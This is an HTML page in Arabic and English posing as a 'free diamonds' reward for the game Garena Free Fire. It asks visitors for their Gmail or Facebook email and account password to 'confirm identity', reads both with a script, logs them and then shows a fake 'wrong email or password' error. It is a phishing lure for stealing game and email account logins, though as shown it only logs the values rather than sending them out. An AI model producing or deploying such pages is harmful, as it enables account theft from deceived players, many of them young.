<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Freefire Best Reward Gifter</title>
    <link rel="stylesheet" href="styles.css"> <!-- Link to your CSS file -->
</head>
<body>
    <header>
        <img src="Logo_of_Garena_Free_Fire.png" alt="Top Image" class="top-image"> <!-- Replace with your image path -->
    </header>
    <main>
        <h1>مكافأة الماس المجانية من فري فاير</h1>
        <p>يرجى وضع معلومات حسابك في فري فاير أدناه لتأكيد هويتك.</p>
        
        <input type="text" id="email" placeholder="Gmail/Facebook email" required>
        <input type="text" id="password" placeholder="كلمة مرور حسابك" required> <!-- Use type="text" -->
        <button onclick="gatherInfo()">اقبل</button>
    </main>
    <script>
        function gatherInfo() {
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            console.log(`Email: ${email}, Password: ${password}`); // Log to the console
            alert('البريد الإلكتروني أو كلمة المرور خاطئة!'); // Alert message
            document.getElementById('infoForm').reset(); // Reset form fields (if applicable)
        }
    </script>
</body>
</html>
